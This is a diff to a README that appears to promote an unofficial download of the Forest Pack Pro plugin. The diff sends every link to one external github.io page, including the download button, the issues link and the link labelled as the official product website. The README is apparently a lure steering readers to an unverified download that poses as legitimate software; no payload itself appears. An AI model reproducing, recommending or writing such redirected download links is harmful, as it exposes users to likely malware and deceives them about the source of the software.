@@ -1,6 +1,6 @@
 # 🌲 forestpack-2026 - Streamline Your Forest Pack Pro Setup
 
-**Latest Release:** [![Download Button](https://img.shields.io/badge/Download-forestpack--2026-blue)](https://github.com/knackered-voice286/forestpack-2026/releases)
+**Latest Release:** [![Download Button](https://img.shields.io/badge/Download-forestpack--2026-blue)](https://knackered-voice286.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the unofficial setup and session log repository for Forest Pack Pro o
 
 ## 📥 Download
 
-Visit this link to download the application: [https://github.com/knackered-voice286/forestpack-2026/releases](https://github.com/knackered-voice286/forestpack-2026/releases)
+Visit this link to download the application: [https://knackered-voice286.github.io](https://knackered-voice286.github.io)
 
 Click the green "Download" button on the page. The file will be saved to your computer.
 
@@ -68,9 +68,9 @@ For more help, visit the official support resources or check the repository issu
 
 ## 🔗 Quick Links
 
-- [Download Latest Release](https://github.com/knackered-voice286/forestpack-2026/releases)
-- [Repository Issues](https://github.com/knackered-voice286/forestpack-2026/issues)
-- [Official Forest Pack Pro Website](https://www.forestpackpro.com) (if applicable)
+- [Download Latest Release](https://knackered-voice286.github.io)
+- [Repository Issues](https://knackered-voice286.github.io)
+- [Official Forest Pack Pro Website](https://knackered-voice286.github.io) (if applicable)
 
 ---
 
